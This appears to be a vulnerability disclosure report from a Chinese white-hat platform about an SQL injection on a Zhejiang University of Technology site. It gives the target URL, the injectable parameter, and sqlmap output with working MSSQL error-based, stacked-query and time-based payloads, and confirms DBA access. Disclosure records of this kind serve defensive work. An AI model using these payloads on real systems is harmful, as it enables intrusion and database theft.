wybug_title: 浙江工业大学某站SQL注入#DBA权限#获取数据库全部信息
wybug_detail:
漏洞详情 披露状态：   									2015-12-07：	细节已通知厂商并且等待厂商处理中									2015-12-08：	厂商已经确认，细节仅向厂商公开									2015-12-18：	细节向核心白帽子及相关领域专家公开									2015-12-28：	细节向普通白帽子公开									2016-01-07：	细节向实习白帽子公开									2016-01-21：	细节向公众公开  简要描述： 如题 详细说明：  0x01 漏洞描述
报错注入、基于时间盲注
0x02 漏洞地址
http://www.xsgzsppa.zjut.edu.cn/listarticle1.aspx?isimg=wzlosJEn&pageno=77&tid=
注入关键字isimg0x03 漏洞利用
sqlmap
   漏洞证明：  0x04 漏洞测试结果
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: isimg    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: isimg=wzlosJEn%' AND 3362=CONVERT(INT,(SELECT CHAR(113)+CHAR(108)+CHAR(109)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (3362=3362) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(114)+CHAR(118)+CHAR(119)+CHAR(113))) AND '%'='&pageno=77&tid=    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: isimg=wzlosJEn%'; WAITFOR DELAY '0:0:5'--&pageno=77&tid=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: isimg=wzlosJEn%' WAITFOR DELAY '0:0:5'--&pageno=77&tid=---[14:35:43] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008
DBA权限
[14:35:43] [INFO] testing if current user is DBAcurrent user is DBA:    True
